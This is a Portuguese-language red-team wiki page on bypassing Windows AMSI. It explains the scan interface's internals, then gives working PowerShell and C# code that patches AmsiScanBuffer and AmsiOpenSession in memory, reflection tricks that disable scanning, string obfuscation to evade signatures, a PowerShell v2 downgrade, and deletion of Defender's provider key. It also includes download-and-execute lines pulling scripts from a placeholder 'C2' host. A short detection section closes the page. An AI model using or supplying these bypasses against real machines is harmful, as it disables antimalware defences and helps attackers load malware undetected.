---
layout: cyber
section: evasao
title: "AMSI Bypass — Antimalware Scan Interface"
---

# AMSI Bypass — Antimalware Scan Interface

# O que é?

AMSI (Antimalware Scan Interface) é uma API pública do Windows introduzida no Windows 10 e
Windows Server 2016 que permite a qualquer aplicação enviar conteúdo arbitrário — scripts,
buffers de memória, comandos — para o produto antimalware instalado no sistema para scanning
em tempo real, antes da execução.

A interface é exposta via `amsi.dll`, uma DLL que é carregada diretamente no espaço de
endereçamento do processo host (PowerShell, WSH, Office, etc.). Não há comunicação fora do
processo para a DLL ser carregada — ela é injetada como qualquer outra dependência. Isso
significa que a DLL roda no mesmo Ring 3 que o processo chamador, acessível via APIs Win32.

A API pública é composta pelas seguintes funções, documentadas no Win32 API Reference da
Microsoft:

```
AmsiInitialize       — inicializa um contexto AMSI para o processo chamador
AmsiOpenSession      — abre uma sessão de scanning para uma sequência de conteúdo relacionado
AmsiScanBuffer       — envia buffer de bytes arbitrários para scanning
AmsiScanString       — variante de AmsiScanBuffer para strings Unicode (wide chars)
AmsiCloseSession     — fecha a sessão de scanning
AmsiUninitialize     — libera o contexto AMSI e recursos associados
```

Os resultados possíveis retornados pelo scanning são codificados no enum `AMSI_RESULT`:

```
AMSI_RESULT_CLEAN              (0)     — conteúdo limpo, executar normalmente
AMSI_RESULT_NOT_DETECTED       (1)     — sem detecção positiva (equivalente a CLEAN)
AMSI_RESULT_BLOCKED_BY_ADMIN   (16384) — bloqueado por política administrativa
AMSI_RESULT_DETECTED           (32768) — MALWARE DETECTADO, bloquear execução
```

O ponto arquitetural mais importante: `AmsiScanBuffer` recebe um ponteiro para um buffer e o
tamanho em bytes. Quando PowerShell desofusca um script — independentemente de quantas camadas
de encoding foram usadas — o conteúdo desofuscado é passado para `AmsiScanBuffer` antes de
ser executado. O AV vê o código real, não a forma ofuscada.

A Microsoft documenta a API AMSI completa em:
`https://docs.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-portal`

# Onde é implementado?

O AMSI é implementado em múltiplas aplicações e runtimes do Windows. As mais relevantes para
operações red team:

**Aplicações que carregam amsi.dll nativamente:**

```
PowerShell v5.0+
  — Windows 10 1507 em diante
  — Scaneia cada Script Block antes da execução (Event ID 4104 captura o conteúdo)
  — Inclui PowerShell Core (v6+) desde sua versão inicial

Windows Script Host (wscript.exe / cscript.exe)
  — Desde Windows 10 1607
  — Scaneia VBScript e JScript antes da execução
  — Relevante para droppers e stagers baseados em WSH

JScript e VBScript via IE e Edge
  — Desde Windows 10 1607
  — Scripts inline em páginas web são scaneados

Office VBA (macros)
  — Office 365 / Office 2016+
  — Macros são scaneadas antes de execução
  — Relevante para ataques de phishing com documentos Office

.NET CLR (assemblies carregados via reflection)
  — A partir do .NET Framework 4.8 e .NET Core 3.1
  — Assembly.Load(bytes) aciona AmsiScanBuffer antes de carregar o assembly
  — Crítico para loaders .NET que carregam Cobalt Strike, Rubeus, etc.

UAC (User Account Control)
  — Desde Windows 10 1607
  — Scripts de instalação verificados antes da elevação

Mshta (mshta.exe)
  — Microsoft HTML Application Host
  — Arquivos HTA scaneados antes da execução

MSXML e XmlLite
  — Procesamento de XML/XSLT com scripts embedded
```

**Produtos antimalware que registram como AMSI providers (via COM registration):**

O mecanismo de extensão do AMSI usa COM. Qualquer AV/EDR pode registrar um provider AMSI
na chave de registro `HKLM\SOFTWARE\Microsoft\AMSI\Providers\{GUID}`. Providers conhecidos:

```
Windows Defender (provider padrão, sempre presente)
  GUID: {2781761E-28E0-4109-99FE-B9D127C57AFE}

CrowdStrike Falcon
SentinelOne
Carbon Black (VMware Carbon Black)
Cylance (BlackBerry)
Sophos
ESET
Kaspersky
Malwarebytes
Trend Micro
```

Cada provider registrado recebe uma cópia do conteúdo via interface COM `IAntimalwareProvider`
e retorna seu próprio `AMSI_RESULT`. O resultado mais severo entre todos os providers é usado.

# Como funciona de forma adequada?

O fluxo completo de uma chamada AMSI, desde o script até a decisão do AV:

```
+------------------------------------------------------------------+
|                    PROCESSO HOST (Ex: powershell.exe)            |
|                                                                  |
|  Script recebido                                                 |
|  (pode estar ofuscado, encodado em base64, etc.)                 |
|         |                                                        |
|         v                                                        |
|  PowerShell Engine desofusca / expande o script                  |
|  (IEX, [System.Text.Encoding]::Unicode.GetString, etc.)         |
|         |                                                        |
|         v                                                        |
|  Script em texto claro (conteúdo real)                           |
|         |                                                        |
|         v                                                        |
|  amsi.dll carregada no processo                                  |
|  +------------------------------------+                          |
|  |  AmsiInitialize("PowerShell", ...) |                          |
|  |  AmsiOpenSession(ctx, &session)    |                          |
|  |  AmsiScanBuffer(                   |                          |
|  |    ctx,                            |                          |
|  |    buffer_ptr,    <- ponteiro para o conteúdo claro           |
|  |    buffer_len,    <- tamanho em bytes                         |
|  |    contentName,   <- nome/path do script (opcional)           |
|  |    session,                        |                          |
|  |    &result        <- AMSI_RESULT   |                          |
|  |  )                                 |                          |
|  +------------------------------------+                          |
|         |                                                        |
|         v                                                        |
|  amsi.dll itera sobre providers registrados (via COM)            |
|  +------------------------------------+                          |
|  |  Provider 1: Windows Defender      |                          |
|  |    IAntimalwareProvider::Scan()    |                          |
|  |    -> MsMpEng.exe (via RPC)        |                          |
|  |    -> MpEngine.dll (scan engine)   |                          |
|  |    <- AMSI_RESULT                  |                          |
|  |                                    |                          |
|  |  Provider 2: EDR Instalado         |                          |
|  |    IAntimalwareProvider::Scan()    |                          |
|  |    <- AMSI_RESULT                  |                          |
|  +------------------------------------+                          |
|         |                                                        |
|         v                                                        |
|  Resultado mais severo entre todos providers                     |
|         |                                                        |
|         +-- AMSI_RESULT_CLEAN     --> PowerShell executa script  |
|         |                                                        |
|         +-- AMSI_RESULT_DETECTED  --> PowerShell BLOQUEIA        |
|                                       lança ScriptHalted error   |
+------------------------------------------------------------------+
```

**Diferença fundamental entre AV tradicional (disco) vs AMSI (memória):**

```
AV TRADICIONAL (on-access scanning):
  Arquivo .ps1 gravado em disco
         |
         v
  AV intercepta operação de I/O (minifilter driver)
         |
         v
  Scaneia o arquivo ofuscado em disco
         |
         v
  Arquivo com "IEX($env:payload)" = NÃO detectado (ofuscado)

AMSI (in-memory scanning):
  PowerShell recebe conteúdo (do disco, da rede, ou de variável)
         |
         v
  PowerShell desofusca internamente
         |
         v
  AmsiScanBuffer recebe o texto CLARO desofuscado
         |
         v
  "Invoke-Mimikatz" em texto claro = DETECTADO
```

Esta é a razão pela qual o AMSI quebrou as técnicas de evasão baseadas apenas em ofuscação
de scripts: o AV não precisa mais entender o encoding — recebe o conteúdo já processado.

**Como os providers são registrados e o AMSI os descobre:**

```
Registro do provider pelo AV durante instalação:
HKLM\SOFTWARE\Microsoft\AMSI\Providers\
  {2781761E-28E0-4109-99FE-B9D127C57AFE}   <- Windows Defender
    (Default) = ""                           <- Chave vazia, GUID é o identificador

O GUID referencia uma entrada COM padrão:
HKLM\SOFTWARE\Classes\CLSID\{2781761E-...}\InprocServer32
  (Default) = "C:\ProgramData\Microsoft\Windows Defender\Platform\...\MpOav.dll"

amsi.dll enumera todas subchaves de \Providers\ e carrega cada CLSID via CoCreateInstance()
Cada provider implementa a interface COM IAntimalwareProvider definida em amsi.h
```

**Por que o AMSI é contornável em userland:**

Como `amsi.dll` é carregada no mesmo processo que o atacante controla, é possível modificar
sua memória, seus ponteiros de função e seus dados internos a partir do mesmo processo. O
AMSI não tem mecanismo de auto-proteção em Ring 3 — depende do EDR/AV de kernel para detectar
modificações. Esta é a superfície de ataque de todas as técnicas de bypass descritas abaixo.

---

## A Mecânica Interna do AMSI

### Fluxo Completo do AMSI

O AMSI é implementado como uma DLL (`amsi.dll`) que é carregada no processo host. O fluxo de uma chamada AMSI é:

```
Aplicação (PowerShell, WScript, etc.)
    |
    v
AmsiInitialize()          <- Inicializa contexto AMSI para o processo
    |
    v
AmsiOpenSession()         <- Abre sessão de scan para uma sequência de conteúdo
    |
    v
AmsiScanBuffer()          <- Envia buffer de conteúdo para scan
AmsiScanString()          <- Versão para strings (wide chars)
    |
    v
Resultado: AMSI_RESULT
    |
    +-- AMSI_RESULT_CLEAN (0)           -> Executar normalmente
    +-- AMSI_RESULT_NOT_DETECTED (1)    -> Sem detecção (sinônimo de CLEAN)
    +-- AMSI_RESULT_BLOCKED_BY_ADMIN_START (16384) -> Bloqueado por política
    +-- AMSI_RESULT_DETECTED (32768)    -> MALWARE DETECTADO — bloquear execução
    |
    v
AmsiCloseSession()        <- Fechar sessão
AmsiUninitialize()        <- Liberar contexto
```

### Definições das Funções AMSI

```c
// amsi.h — assinaturas das funções relevantes

HRESULT AmsiInitialize(
    LPCWSTR appName,          // Nome da aplicação (ex: "PowerShell")
    HAMSICONTEXT *amsiContext  // Handle de contexto retornado
);

HRESULT AmsiOpenSession(
    HAMSICONTEXT amsiContext,
    HAMSISESSION *amsiSession  // Handle de sessão retornado
);

HRESULT AmsiScanBuffer(
    HAMSICONTEXT amsiContext,
    PVOID buffer,              // Buffer com conteúdo a ser scaneado
    ULONG length,              // Tamanho do buffer em bytes
    LPCWSTR contentName,       // Nome/caminho do conteúdo (opcional)
    HAMSISESSION amsiSession,  // Handle de sessão
    AMSI_RESULT *result        // Resultado do scan
);

HRESULT AmsiScanString(
    HAMSICONTEXT amsiContext,
    LPCWSTR string,            // String a ser scaneada (wide char)
    LPCWSTR contentName,
    HAMSISESSION amsiSession,
    AMSI_RESULT *result
);
```

### amsiContext — A Estrutura Que Habilita os Bypasses

Toda chamada AMSI subsequente a `AmsiInitialize` recebe um ponteiro para `amsiContext` — estrutura **não documentada** alocada na heap unmanaged. Análise via WinDbg revela que os primeiros 4 bytes contêm a magic string `"AMSI"` (0x49534D41 em little-endian):

```
0:014> dc 0x1f862fa6f40
000001f8`62fa6f40  49534d41 00000000 48efe1f8 000001f8  AMSI........H...
000001f8`62fa6f50  4905dd30 000001f8 00000039 00000000  0..I....9.......
```

Esses 4 bytes funcionam como **verificação de integridade** em todas as APIs AMSI subsequentes.

### AmsiOpenSession — Header Verification Flow

Ao desassemblar `amsi!AmsiOpenSession` no WinDbg:

```asm
amsi!AmsiOpenSession:
    test    rcx, rcx                  ; ctx é NULL?
    je      _AmsiOpenSession+0x4b     ; → erro
    cmp     dword ptr [rcx], 49534D41h ; primeiros 4 bytes == "AMSI"?
    jne     _AmsiOpenSession+0x4b     ; → erro
    cmp     qword ptr [rcx+8], 0      ; campos adicionais válidos?
    je      _AmsiOpenSession+0x4b
    ...

_AmsiOpenSession+0x4b:
    mov     eax, 80070057h            ; E_INVALIDARG
    ret
```

`0x80070057` = `E_INVALIDARG`. Uma vez retornado, o caller (PowerShell) abandona a sessão de scan → `AmsiScanBuffer` nunca é chamado.

### Os 3 Métodos de Bypass Mapeados ao Mesmo Bug

Todos os bypasses populares exploram a **mesma verificação de header**:

| Técnica | Onde ataca | Mecânica |
|---------|-----------|----------|
| `amsiInitFailed = true` (Matt Graeber 2016) | Managed wrapper (PowerShell .NET) | Wrapper checa flag antes de chamar APIs — pula scan se "init falhou" |
| Zerar `amsiContext` header | Estrutura nativa | `AmsiOpenSession` lê magic e falha com E_INVALIDARG |
| Binary patch `AmsiOpenSession` | Código da função | Forçar JE em vez de JNE → sempre retorna erro |

#### Binary Patch — TEST RDX,RDX → XOR RAX,RAX

A primeira instrução de `AmsiOpenSession` é `test rdx, rdx` (4885D2 — 3 bytes). Substituindo por `xor rax, rax` (4831C0 — também 3 bytes) → Zero Flag sempre seta → `je` no início pula para o branch de erro → função retorna erro mesmo com argumentos válidos.

```
Original:  48 85 D2  →  test rdx, rdx
                        (ZF dependente de rdx)
Patched:   48 31 C0  →  xor rax, rax
                        (ZF sempre = 1 → je sempre toma branch)
```

Como ambas instruções ocupam **exatamente 3 bytes**, não há deslocamento dos endereços subsequentes — patch limpo, sem precisar reescrever toda a função.

```powershell
# Implementação via Win32 APIs
function LookupFunc {
    Param ($moduleName, $functionName)
    $assem = ([AppDomain]::CurrentDomain.GetAssemblies() |
              Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\')[-1].
                Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
    $tmp = @()
    $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp += $_}}
    return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null,
        @($moduleName)), $functionName))
}

# Resolver AmsiOpenSession
[IntPtr]$funcAddr = LookupFunc amsi.dll AmsiOpenSession

# Mudar proteção para RW
$oldProtect = 0
[Microsoft.Win32.UnsafeNativeMethods]::VirtualProtect($funcAddr, [uint32]3, 0x40,
    [ref]$oldProtect)

# Aplicar patch: 48 31 C0 (XOR RAX,RAX)
$patch = [byte[]]@(0x48, 0x31, 0xC0)
[System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $funcAddr, 3)
```

#### Reflection — Zerar amsiContext via Managed Code

Não requer WinDbg nem manipulação de assembly. Acessa `amsiContext` (campo privado static) via .NET reflection e zera os 4 bytes do header:

```powershell
$a=[Ref].Assembly.GetTypes()
Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}}
$d=$c.GetFields('NonPublic,Static')
Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}}
$g=$f.GetValue($null)
[IntPtr]$ptr=$g
[Int32[]]$buf=@(0)
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
# Sobrescreve "AMSI" magic com 4 zeros → AmsiOpenSession retorna E_INVALIDARG
```

Vantagem: nenhum nome de string suspeita explícita (`AmsiUtils` é descoberto via wildcard `*iUtils`) → AMSI signature scanning não pega.

### Quais Aplicações Usam AMSI

Desde Windows 10, várias aplicações integram AMSI nativamente:

| Aplicação | Desde | O que é scaneado |
|-----------|-------|-----------------|
| PowerShell 5.0+ | Windows 10 1507 | Script blocks antes de execução |
| Windows Script Host (WScript/CScript) | Win10 1607 | VBScript, JScript |
| JavaScript/VBScript via IE e Edge | Win10 1607 | Scripts inline |
| Office VBA | Office 365 (2018+) | Macros antes de execução |
| .NET CLR 4.8+ | Windows 10 1903 | Assemblies carregados via reflection |
| UAC | Win10 1607 | Scripts de instalação |
| PowerShell Core (6+) | Desde o início | Script blocks |

**Implicação prática:** O AMSI não é apenas sobre PowerShell. Scripts VBScript e JScript usados em droppers também são scaneados.

### Como o AV Se Conecta ao AMSI

Quando um processo chama `AmsiInitialize`, o AMSI procura providers registrados no registro:

```
HKLM\SOFTWARE\Microsoft\AMSI\Providers\
    {GUID do Windows Defender}
    {GUID de outros AVs instalados}
```

Cada provider registrado recebe uma cópia do conteúdo escaneado. O Windows Defender é o provider padrão, mas qualquer AV pode registrar um provider AMSI.

O provider recebe o conteúdo via interface COM (`IAntimalwareProvider`) e retorna o resultado.

---

## Técnicas de Bypass

### 1. Patch em Memória do AmsiScanBuffer

**Conceito:** Modificar os primeiros bytes de `AmsiScanBuffer` em memória para que a função retorne imediatamente com resultado `AMSI_RESULT_CLEAN` sem chamar o provider real.

**Como `AmsiScanBuffer` começa em x64 (código original):**
```asm
; AmsiScanBuffer em amsi.dll (Windows 10 x64)
AmsiScanBuffer:
    push    rbp
    push    r14
    push    rdi
    push    rsi
    push    rbx
    sub     rsp, 0x50
    ; ... código real da função
```

**Patch alvo — retornar AMSI_RESULT_CLEAN (0) imediatamente:**
```asm
; Patch para retornar S_OK (0) com result = AMSI_RESULT_CLEAN
; Isso faz com que toda chamada a AmsiScanBuffer retorne "limpo"
mov     eax, 0x80070057  ; E_INVALIDARG — resultado que causa clean por ser erro
ret
```

Ou mais elegante (retornar diretamente CLEAN):
```asm
xor     eax, eax   ; eax = 0 (S_OK)
mov     [r8], 1    ; result = AMSI_RESULT_NOT_DETECTED
ret
```

**Implementação em PowerShell:**

```powershell
# Bypass AMSI via patch em memória — PowerShell
# NOTA: Este código é detectado por AMSI antes de ser executado
# Por isso, deve ser ofuscado (ver seção de obfuscação abaixo)

$Win32 = @"
using System;
using System.Runtime.InteropServices;
public class Win32 {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize,
                                              uint flNewProtect, out uint lpflOldProtect);
}
"@

Add-Type $Win32

# Obter endereço de AmsiScanBuffer
$LoadLibrary   = [Win32]::LoadLibrary("amsi.dll")
$Address       = [Win32]::GetProcAddress($LoadLibrary, "AmsiScanBuffer")

# Bytes do patch: xor eax, eax; ret (retorna 0 = S_OK com resultado vazio)
# Mais robusto: mov eax, 0x80070057; ret (força erro que é tratado como clean)
$Patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
# B8 57 00 07 80 = mov eax, 0x80070057
# C3             = ret

# Mudar proteção de memória para escrita
$OldProtect = 0
[Win32]::VirtualProtect($Address, [UIntPtr]::new($Patch.Length), 0x40, [ref]$OldProtect)

# Escrever patch
$Marshal = [System.Runtime.InteropServices.Marshal]
$Marshal::Copy($Patch, 0, $Address, $Patch.Length)

# Restaurar proteção original (opcional — mais stealth)
[Win32]::VirtualProtect($Address, [UIntPtr]::new($Patch.Length), $OldProtect, [ref]$OldProtect)

Write-Host "[+] AMSI patched"
```

**Implementação em C# (para injetar no contexto de outro processo ou usar em loader):**

```csharp
// AmsiPatch.cs — Patch de AmsiScanBuffer em C#
using System;
using System.Runtime.InteropServices;
using System.Text;

class AmsiPatch {
    [DllImport("kernel32")]
    static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32")]
    static extern IntPtr LoadLibrary(string name);

    [DllImport("kernel32")]
    static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize,
                                       uint flNewProtect, out uint lpflOldProtect);

    public static bool PatchAmsi() {
        try {
            // Construir string "amsi.dll" de forma ofuscada
            string amsiDll = new string(new char[]{'a','m','s','i','.','d','l','l'});
            string procName = new string(new char[]{
                'A','m','s','i','S','c','a','n','B','u','f','f','e','r'
            });

            IntPtr hAmsi = LoadLibrary(amsiDll);
            if (hAmsi == IntPtr.Zero) return false;

            IntPtr pAmsiScanBuffer = GetProcAddress(hAmsi, procName);
            if (pAmsiScanBuffer == IntPtr.Zero) return false;

            // Patch: mov eax, 0x80070057; ret
            byte[] patch = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };

            uint oldProtect;
            if (!VirtualProtect(pAmsiScanBuffer, (UIntPtr)patch.Length, 0x40, out oldProtect))
                return false;

            Marshal.Copy(patch, 0, pAmsiScanBuffer, patch.Length);
            VirtualProtect(pAmsiScanBuffer, (UIntPtr)patch.Length, oldProtect, out oldProtect);

            return true;
        }
        catch {
            return false;
        }
    }
}
```

---

### 2. Obfuscação de String (Evitar Detecção pelo AMSI)

O AMSI detecta tanto o payload final quanto os próprios bypasses. A solução é ofuscar o bypass antes de enviá-lo ao PowerShell.

**Técnicas de obfuscação de string:**

```powershell
# Técnica 1: Concatenação de strings
# "AmsiUtils" nunca aparece como literal — é construída em runtime
$amsiUtils = 'Amsi' + 'Utils'

# Técnica 2: Split e Join
"AmsiScanBuffer" -split '' -join ''  # Retorna a string original
# Mais útil: split em partes significativas
('AmsiScan' + 'Buffer')

# Técnica 3: Caracteres individuais
$a = [char]65 + [char]109 + [char]115 + [char]105  # "Amsi"

# Técnica 4: Base64 decode
[System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBtAHMAaQA='))
# Resultado: "Amsi"

# Técnica 5: Reverse string
-join ('reffuBnacSismA'[-1..-15])  # Inverte para "AmsiScanBuffer"

# Técnica 6: Replace de caracteres placeholder
'Am$iScanBuffer'.Replace('$','s')

# Técnica 7: Invoke-Expression com string construída
$cmd = [char]73 + [char]69 + [char]88  # "IEX"
& ([scriptblock]::Create($cmd + " (conteudo do script)"))

# Aplicando ao bypass completo — ofuscar a chamada de AmsiScanBuffer
# O próprio código do bypass deve evitar strings detectáveis como "AmsiScanBuffer"
$funcName = [string]::Join('', @('A','m','s','i','S','c','a','n','B','u','f','f','e','r'))
```

**Obfuscação do bypass completo usando Invoke-Obfuscation ou ISE-Stealth:**

```powershell
# Encoder em PowerShell — codificar o bypass e executa via EncodedCommand
$bypass = 'SEU_BYPASS_AQUI'
$encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($bypass))
powershell -EncodedCommand $encoded

# Via IEX com download (em memória, sem tocar disco)
IEX (New-Object Net.WebClient).DownloadString('http://C2/bypass.ps1')
```

---

### 3. Bypass via .NET Reflection

**Conceito:** Usar reflection do .NET para acessar campos privados da classe `System.Management.Automation.AmsiUtils` e modificar o flag que indica se o AMSI está inicializado.

```powershell
# Bypass via Reflection — modificar campo privado amsiInitFailed
# Este bypass funciona porque PowerShell usa AmsiUtils internamente

$assembly = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
# Se amsiInitFailed = true, o AMSI é ignorado para o resto da sessão

# Obter campo privado via reflection
$field = $assembly.GetField('amsiInitFailed', 'NonPublic,Static')
$field.SetValue($null, $true)

# Versão ofuscada para evitar detecção do próprio bypass:
$assembly = [Ref].Assembly.GetType(
    ('System.Management.Automation.' + 'Amsi' + 'Utils')
)
$fieldName = 'amsi' + 'Init' + 'Failed'
$field = $assembly.GetField($fieldName, [System.Reflection.BindingFlags]::NonPublic -bor
                                        [System.Reflection.BindingFlags]::Static)
$field.SetValue($null, $true)
```

**Por que funciona:** Quando `amsiInitFailed` é `true`, o código interno de PowerShell que chama `AmsiScanBuffer` faz um check prévio e pula o scan se a inicialização "falhou". Isso simula uma falha de inicialização, fazendo com que o AMSI seja ignorado.

**Bypass via reflection em C# (para loaders .NET):**

```csharp
// AmsiReflectionBypass.cs
using System;
using System.Reflection;

class AmsiBypass {
    public static void DisableAmsi() {
        // Construir nome da classe em partes
        string ns   = "System.Management.Automation.";
        string cls  = "Amsi" + "Utils";

        // Obter assembly do PowerShell (se estiver no mesmo processo)
        Assembly psAssembly = null;
        foreach (Assembly a in AppDomain.CurrentDomain.GetAssemblies()) {
            if (a.GetName().Name.Contains("System.Management.Automation")) {
                psAssembly = a;
                break;
            }
        }

        if (psAssembly == null) return;

        Type amsiUtilsType = psAssembly.GetType(ns + cls);
        if (amsiUtilsType == null) return;

        // Modificar campo amsiInitFailed
        string fieldName = "amsiInit" + "Failed";
        FieldInfo field = amsiUtilsType.GetField(
            fieldName,
            BindingFlags.NonPublic | BindingFlags.Static
        );

        if (field != null) {
            field.SetValue(null, true);
        }

        // Também zerar amsiContext se existir
        FieldInfo contextField = amsiUtilsType.GetField(
            "amsiContext",
            BindingFlags.NonPublic | BindingFlags.Static
        );
        if (contextField != null) {
            contextField.SetValue(null, IntPtr.Zero);
        }
    }
}
```

---

### 4. Forçar Erro no AMSI (InvalidInput Technique)

**Conceito:** Passar parâmetros inválidos para `AmsiInitialize` de forma a forçar um estado de erro, fazendo com que o AMSI não funcione corretamente.

```powershell
# Bypass via corrupção do contexto AMSI
# Modifica o amsiContext para zero, forçando falha nas chamadas subsequentes

$assembly = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')

# Obter o handle do contexto AMSI
$contextField = $assembly.GetField(
    'amsiContext',
    [System.Reflection.BindingFlags]::NonPublic -bor
    [System.Reflection.BindingFlags]::Static
)

# Definir contexto como zero (handle inválido)
# Isso faz com que todas as chamadas a AmsiScanBuffer falhem com E_INVALIDARG
$contextField.SetValue($null, [IntPtr]::Zero)
```

**Técnica de erro forçado via tamanho de buffer inválido:**

```powershell
# Forçar erro passando tamanho negativo para AmsiScanBuffer
# O erro faz o PowerShell ignorar o resultado do AMSI
# Implementação via patch dos bytes de verificação de tamanho
```

---

### 5. Downgrade para PowerShell v2

**Conceito:** PowerShell v2 não tem AMSI. Se o .NET 2.0/3.5 estiver instalado, é possível iniciar uma sessão PowerShell v2 que não possui AMSI.

```cmd
# Verificar se PowerShell v2 está disponível
powershell -Version 2 -Command "Get-Host | Select-Object Version"

# Se retornar versão 2.x, AMSI não está disponível nessa sessão
# Executar comandos em modo v2
powershell -Version 2 -Command "IEX (New-Object Net.WebClient).DownloadString('http://C2/payload.ps1')"

# Via PowerShell atual:
Start-Process powershell.exe -ArgumentList "-Version 2 -Command `"IEX ...`""

# Verificar instalação do .NET 2.0 (requisito para v2)
Get-WindowsOptionalFeature -Online -FeatureName NetFx3
# ou
Get-ItemProperty "HKLM:SOFTWARE\Microsoft\NET Framework Setup\NDP\v2.0.50727"
```

**Limitação:** PowerShell v2 tem funcionalidades limitadas. Módulos modernos podem não funcionar. Em ambientes Windows 10 atualizados, .NET 2.0 pode não estar instalado.

**Verificar se downgrade funcionou:**
```powershell
# No PowerShell v2, $PSVersionTable.PSVersion.Major == 2
# e AMSI não existe
$PSVersionTable
[System.AppDomain]::CurrentDomain.GetAssemblies() |
    Where-Object {$_.GetName().Name -like "*amsi*"}  # Deve retornar vazio
```

---

### 6. AMSI Provider Unload / Disable

**Conceito:** Desregistrar o provider AMSI do Windows Defender, impedindo que ele receba conteúdo para scan.

```powershell
# Requer privilégios administrativos
# Listar providers AMSI registrados
Get-ChildItem "HKLM:\SOFTWARE\Microsoft\AMSI\Providers"

# O provider do Defender tem um GUID específico
# Remover temporariamente (apenas para sessão atual, não persiste reboot)
# GUID padrão do Windows Defender AMSI Provider:
# {2781761E-28E0-4109-99FE-B9D127C57AFE}

# Requer admin:
Remove-Item "HKLM:\SOFTWARE\Microsoft\AMSI\Providers\{2781761E-28E0-4109-99FE-B9D127C57AFE}" -Force

# Restaurar (necessário para não quebrar o ambiente):
New-Item "HKLM:\SOFTWARE\Microsoft\AMSI\Providers\{2781761E-28E0-4109-99FE-B9D127C57AFE}"
```

**Nota:** Esta técnica requer privilégios de administrador e modifica o registro — muito barulhenta do ponto de vista de OPSEC.

---

## AMSI em .NET 4.8+ e Como Contornar

A partir do .NET 4.8 e .NET Core 3.1, a Microsoft adicionou suporte nativo a AMSI para assemblies carregados via reflection. Isso significa que:

```csharp
// Carregamento de assembly que NÃO aciona AMSI (versões anteriores):
Assembly.Load(bytes);  // Em .NET < 4.8, sem AMSI

// Em .NET 4.8+, Assembly.Load() aciona AmsiScanBuffer antes de carregar
Assembly.Load(bytes);  // AMSI ATIVO
```

**Bypass para .NET 4.8+:**

```csharp
// Técnica 1: Patch AMSI antes de carregar o assembly
// Usar o patch de AmsiScanBuffer mostrado anteriormente, ANTES do Assembly.Load()
AmsiPatch.PatchAmsi();
Assembly.Load(encryptedBytes);  // Agora sem AMSI

// Técnica 2: Usar Assembly.LoadFile() em alguns contextos
// LoadFile tem comportamento diferente de Load em alguns casos

// Técnica 3: Modificar o campo amsiEnable da classe RuntimeAssembly via reflection
// (técnica mais avançada, dependente da versão do .NET runtime)

// Técnica 4: Carregar assembly em novo AppDomain com AMSI não inicializado
// (funciona em alguns cenários de .NET Framework)
AppDomain newDomain = AppDomain.CreateDomain("ShadowDomain");
// ... carregar no novo AppDomain antes do AMSI ser inicializado
```

**Bypass específico para CLR .NET (AMSI em runtime):**

```csharp
// AmsiClrBypass.cs — Patching do AMSI no contexto CLR
// Necessário quando Assembly.Load() está scaneando

using System;
using System.Runtime.InteropServices;

class ClrAmsiBypass {
    [DllImport("kernel32")]
    static extern IntPtr GetProcAddress(IntPtr hModule, string proc);
    [DllImport("kernel32")]
    static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    static extern bool VirtualProtect(IntPtr addr, UIntPtr size, uint prot, out uint oldProt);

    public static void Patch() {
        // Patch deve acontecer ANTES de qualquer chamada a Assembly.Load com conteúdo malicioso
        // O AMSI CLR usa a mesma amsi.dll, então o patch de AmsiScanBuffer funciona
        var lib  = LoadLibrary("amsi");
        var addr = GetProcAddress(lib, "AmsiScanBuffer");
        byte[] patch = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
        uint old;
        VirtualProtect(addr, (UIntPtr)patch.Length, 0x40, out old);
        Marshal.Copy(patch, 0, addr, patch.Length);
        VirtualProtect(addr, (UIntPtr)patch.Length, old, out old);
    }
}
```

---

## Testando se o AMSI Está Bypassado

```powershell
# Teste oficial da Microsoft — string que SEMPRE deveria ser detectada pelo AMSI
# Se não for detectada, o bypass funcionou
$test = 'AMSI' + 'Test' + 'Sample' + '60c4-4468-9dbe-fbe'
# String completa: "AMSITestSample60c4-4468-9dbe-fbe"
# Windows Defender sempre retorna AMSI_RESULT_DETECTED para essa string

# Teste mais discreto (gera menos logs):
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField(
    'amsiInitFailed','NonPublic,Static').GetValue($null)
# Se retornar True, bypass de reflection funcionou

# Teste funcional — tentar executar algo que seria normalmente bloqueado
# (usar uma string de teste inócua mas que normalmente aciona o AMSI)
try {
    IEX 'Write-Host "AMSI bypassed"'
    Write-Host "[+] AMSI está bypassado ou inativo"
} catch {
    Write-Host "[-] AMSI ainda ativo: $_"
}

# Verificar se amsi.dll está carregada
[System.AppDomain]::CurrentDomain.GetAssemblies() |
    Where-Object { $_.GetName().Name -like "*amsi*" }
```

---

## Detecção e OPSEC

### O Que os Defensores Detectam

**Event IDs relevantes:**
```
Microsoft-Windows-PowerShell/Operational:
  4104 — Script Block Logging: captura o conteúdo do script block ANTES da execução
          (se AMSI não estiver bypassado, o conteúdo já foi scaneado)

Microsoft-Windows-Windows Defender/Operational:
  1116 — Ameaça detectada (quando AMSI retorna DETECTED)
  1117 — Ameaça bloqueada

Sysmon (Event ID 8):
  CreateRemoteThread: patches via thread remota seriam detectados
  
Sysmon (Event ID 10):
  ProcessAccess: acesso à memória do processo para patching
```

**Assinaturas de bypass detectadas:**
- Strings como "AmsiScanBuffer", "amsiInitFailed", "AmsiUtils" em scripts não ofuscados
